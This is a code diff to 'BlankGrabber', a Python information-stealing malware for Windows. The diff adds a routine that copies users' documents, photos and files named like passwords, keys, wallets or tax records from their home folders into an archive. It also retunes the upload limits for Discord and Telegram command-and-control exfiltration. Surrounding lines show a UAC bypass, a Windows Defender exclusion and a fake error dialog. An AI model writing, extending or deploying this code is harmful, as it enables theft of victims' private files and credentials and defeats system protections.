@@ -42,6 +42,7 @@ class Settings:
     CaptureSystemInfo = bool("%capturesysteminfo%")
     CaptureScreenshot = bool("%capturescreenshot%")
     CaptureTelegram = bool("%capturetelegram%")
+    CaptureCommonFiles = bool("%capturecommonfiles%")
     CaptureWallets = bool("%capturewallets%")
 
     FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
@@ -853,6 +854,7 @@ class BlankGrabber:
     MinecraftSessions: int = 0 # Number of Minecraft session files collected
     WebcamPictures: int = 0 # Number of webcam snapshots collected
     TelegramSessions: int = 0 # Number of Telegram sessions collected
+    CommonFiles: int = 0 # Number of files collected
     WalletsCount: int = 0 # Number of different crypto wallets collected
     SteamCount: int = 0 # Number of steam accounts collected
     EpicCount: int = 0 # Number of epic accounts collected
@@ -889,6 +891,7 @@ class BlankGrabber:
             (self.TakeScreenshot, False),
             (self.BlockSites, True),
             (self.Webshot, True),
+            (self.StealCommonFiles, True)
         ):
             thread = Thread(target= func, daemon= daemon)
             thread.start()
@@ -908,6 +911,31 @@ class BlankGrabber:
             shutil.rmtree(self.TempFolder) # Remove the temporary folder from the system
         except Exception:
             pass
+    
+    @Errors.Catch
+    def StealCommonFiles(self) -> None: # Steals common files from the system
+        if Settings.CaptureCommonFiles:
+            for name, dir in (
+                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
+                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
+                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
+                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
+                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
+                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
+            ):
+                if os.path.isdir(dir):
+                    file: str
+                    for file in os.listdir(dir):
+                        if os.path.isfile(os.path.join(dir, file)):
+                            if (any([x in file.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
+                                or file.endswith((".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx"))) \
+                                and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024: # File less than 2 MB
+                                try:
+                                    os.makedirs(os.path.join(self.TempFolder, "Common Files", name), exist_ok= True)
+                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, "Common Files", name, file))
+                                    self.CommonFiles += 1
+                                except Exception:
+                                    pass
 
     @Errors.Catch
     def StealMinecraft(self) -> None: # Steals Minecraft session files
@@ -1104,17 +1132,22 @@ class BlankGrabber:
             ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
         
             output = {}
-            for location in ['Desktop', 'Documents' , 'Downloads', 'Music', 'Pictures', 'Videos']:
-                location = os.path.join(os.getenv('userprofile'), location)
-                if not os.path.isdir(location):
-                    continue
-                dircontent = os.listdir(location)
-                if 'desltop.ini' in dircontent:
-                    dircontent.remove('desktop.ini')
-                if dircontent:
-                    process = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= location)
-                    if process.returncode == 0:
-                        output[os.path.split(location)[-1]] = (os.path.basename(location) + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])).replace("|   ", PIPE).replace("+---", TEE).replace("\---", ELBOW)
+            for name, dir in (
+                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
+                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
+                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
+                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
+                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
+                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
+            ):
+                if os.path.isdir(dir):
+                    dircontent: list = os.listdir(dir)
+                    if 'desltop.ini' in dircontent:
+                        dircontent.remove('desktop.ini')
+                    if dircontent:
+                        process = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= dir)
+                        if process.returncode == 0:
+                            output[name] = (name + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])).replace("|   ", PIPE).replace("+---", TEE).replace("\---", ELBOW)
 
             for key, value in output.items():
                 os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
@@ -1471,6 +1504,7 @@ class BlankGrabber:
                             "History" : len(self.History),
                             "Roblox Cookies" : len(self.RobloxCookies),
                             "Telegram Sessions" : self.TelegramSessions,
+                            "Common Files" : self.CommonFiles,
                             "Wallets" : self.WalletsCount,
                             "Wifi Passwords" : len(self.WifiPasswords),
                             "Minecraft Sessions" : self.MinecraftSessions,
@@ -1512,8 +1546,9 @@ class BlankGrabber:
 
             filename = "Blank-{}.{}".format(os.getlogin(), extention)
 
-            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # Max upload size is 25 MB
-                url = self.UploadToGofile(self.ArchivePath, filename)
+            if (Settings.C2[0] == 0 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20) \
+                or (Settings.C2[0] == 1 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40): # Max upload size for Discord is 25 MB and for Telegram is 50 MB
+                url = self.UploadToGofile(self.ArchivePath, filename)                                # But just to make sure we set the limit to 20 MB for Discord and 40 MB for Telegram
             else:
                 url = None
             
@@ -1551,11 +1586,12 @@ if __name__ == "__main__" and os.name == "nt":
     
     if not Utility.IsAdmin(): # No administrator permissions
         Logger.warning("Admin privileges not available")
-        if Utility.GetSelf()[1] and not "--nouacbypass" in sys.argv:
-            Logger.info("Trying to bypass UAC (Application will restart)")
-            Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
-        else:
-            Logger.error("Failed to bypass UAC")
+        if Utility.GetSelf()[1]:
+            if not "--nouacbypass" in sys.argv:
+                Logger.info("Trying to bypass UAC (Application will restart)")
+                Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
+            else:
+                Logger.error("Failed to bypass UAC")
     
     if Utility.GetSelf()[1]: 
         Logger.info("Trying to exclude the file from Windows defender")
